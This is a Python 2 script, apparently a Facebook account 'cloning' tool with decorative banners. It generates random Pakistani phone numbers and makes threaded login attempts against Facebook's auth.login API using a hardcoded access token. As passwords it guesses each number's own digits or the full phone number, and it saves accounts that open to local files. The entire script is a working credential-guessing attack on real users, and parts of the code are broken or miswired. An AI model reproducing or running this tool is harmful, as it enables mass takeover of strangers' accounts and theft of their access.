# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,getpass
#from importlib import reload
os.system("rm -rf .txt")
for i in range(500):
	number=random.randint(1111111, 9999999)
	file=open(".txt","a")
	file.write(str(number)+"\n")
    
try:
    import requests
except ImportError:
    os.system("pip2 install mechanize")
    
try:
    import mechanize
except ImportError:
    os.system("pip2 install request")
    #time.sleep(1)
    os.system("Then type: python2 boss")
#from importlib import reload
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


#reload(sys)
#sys.setdefaultencoding("utf8")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
br.addheaders = [("user-agent","Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")]

def keluar():
	print("Thanks.")
	os.sys.exit()

def acak(b):
    w = "ahtdzjc"
    d = ""
    for i in "x":
        d += "!"+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = "ahtdzjc"
    for i in w:
        j = w.index(i)
        x= x.replace("!%s"%i,"\033[%s;1m"%str(31+j))
    x += "\033[0m"
    x = x.replace("!0","\033[0m")
    sys.stdout.write(x+"\n")


#def print(z):
def tik():
    titik = [
     "   ", ".   "]
    for o in titik:
        print("\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m" + o,)
        sys.stdout.flush()
        #time.sleep(0.5)


def lodhirt():
    lodhirt = ["q"]
    for o in lodhirt:
        print("\r\x1b[1;94m                     \x1b[1;92m" + o,)
        sys.stdout.flush()
        #time.sleep(0.5)




back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

####Logo####

logo1 = """

🌿
　 　 　 　 🌿
🌿　 　 　 🌿　 　 　 🌿
　 🌿　 　 🌿　 　 🌿
　 　 🌿　 🌿　 🌿
　 　 　 🌿🌿🌿
🌿🌿🌿🌿🌿🌿🌿🌿🌿
　 　 　 　 🌿
　 　 　 　 🌿
 
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;93m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;94m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;96m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;92m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;91m██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
\033[1;92m██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
\033[1;93m██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
\033[1;94m██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
\033[1;95m██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
\033[1;96m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░
\033[1;90m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;90m NOTE:::::
\033[1;93mUSE FAST 4G INTERNET
\033[1;95m FAST CLONING K LIA 4/GB SA
 6/GB RAM WALA PHONE USE KRA

"""
logo2 = """

\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗      
\033[1;92m██╔════╝██╔══██╗████╗░████║██║     
\033[1;93m╚█████╗░██║░░██║██╔████╔██║██║  
\033[1;94m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;96m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝   
                                                                                                                                         
                                  

■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
"""     

##### LICENSE #####
#=================#
def lisensi():
    os.system("clear")
    login()
####login#########
def login():
    os.system("clear")
    print (logo1)
    lodhirt()
    print("\033[1;92m■■■■■■■■■■SELECT NUMBER■■■■■■■■■■")
    #time.sleep(0.05)
    print("\033[1;97m[1]\x1b[1;93mSTART\x1b[1;92m CRACKING "  )
    #time.sleep(0.05)
    print("\x1b[1;94m[0]\033[1;91m Exit ( Back)")
    print("\033[1;92m■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
    pilih_login()

def pilih_login():
    bch = input("\n\n \x1b[1;96m>   ")
    if bch == "":
        print("[!] Fill in correctly")
        pilih_login()
    elif bch == "1":
        tik()
    os.system("clear")
    action()
def action():
    bch = input("mmmmm  ")
    if bch == "":
        print("[!] Fill in correctly")
        action()
    elif bch == "1":
        tik()
        os.system("clear")
        print (logo1)
        lodhirt()
        
        try:
            c = input("\033[1;93mCHO\x1b[1;92mOSE : ")
            k="03"
            idlist = (".txt")
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print("[!] File Not Found")
            input("\n[ Back ]")
            login()
    elif bch =="0":
    	tik()
    	login()
    else:
        print("[!] Fill In Correctly")
        action()
    print(47* "\033[1;92m▲\033[1;95m▼")
    xxx = str(len(id))
    print ("[✔]\033[0;96m Total Pakistan ids:\x1b[1;93m "+xxx)
    print ("[⚠]\033[0;95m password will be crack \x1b[1;93m7 digit\x1b[1;96m 11 digit....")
    print ("[⚠]\033[0;93m Found password \x1b[1;92mUSER..")
    print ("[🔐]\033[0;91mTotal Password \x1b[1;94m    "+xxx)
    print ("[✔]\033[0;92mCode you choose\x1b[1;97m: "+c)
    print ("[🚀]\033[0;93mWait A While Start\x1b[1;92m Cracking...")
    print ("[♻]\033[0;94mTo Stop Process Press\x1b[1;93m Ctrl+z")
    print (47* "\033[1;92m▼\033[1;95m▲")
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir("save")
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=" +k+c+user+ "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm")
            q = json.load(data)
            if "access_token" in q:
                print("\x1b[1;93m(Open \x1b[1;96mNow \x1b[1;92m )  " + k + c + user + "\x1b[1;91m ● \x1b[1;95m" + pass1)                                 
                okb = open("save/successfull.txt", "a")
                okb.write(k+c+user+pass1+"\n")
                okb.close()
                oks.append(c+user+pass1)
            else:
                if "www.facebook.com" in q["error_msg"]:
                    print("\033[1;92m(Aftar \x1b[1;97m7days \x1b[1;93m) " + k + c + user + "\x1b[1;91m ● \x1b[1;96m " + pass1)
                    cps = open("save/checkpoint.txt", "a")
                    cps.write(k+c+user+pass1+"\n")
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=" +k+c+user+ "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm")
                    q = json.load(data)
                    if "access_token" in q:
                        print("\x1b[1;93m(Open \x1b[1;96mNow \x1b[1;92m)  " + k + c + user +  "\x1b[1;91m ● \x1b[1;95m" + pass2)
                        okb = open("save/successfull.txt", "a")
                        okb.write(k+c+user+pass2+"\n")
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if "www.facebook.com" in q["error_msg"]:
                            print("\033[1;92m(Aftar \x1b[1;97m7days \x1b[1;93m) " + k + c + user + "\x1b[1;91m ● \x1b[1;96m" + pass2)
                            cps = open("save/checkpoint.txt", "a")
                            cps.write(k+c+user+pass2+"\n")
                            cps.close()
                            cpb.append(c+user+pass2)
                        
                                                                                                          
                                                                                                                                                                                                                    
                                                                                                                                                                                                            
                                                                                           
                                                                                                                                                                                                                    
                                                                                                                                                                                                         
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print (50* "\033[1;91m-")
    print("Process Has Been Completed ...")
    print("Total Online/Offline : "+str(len(oks))+"/"+str(len(cpb)))
    print("Cloned Accounts Has Been Saved : save/cloned.txt")
    print("Note : Your Offline account Will Open after 10 to 20 days")

    
    input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
          
if __name__ == "__main__":
	login()

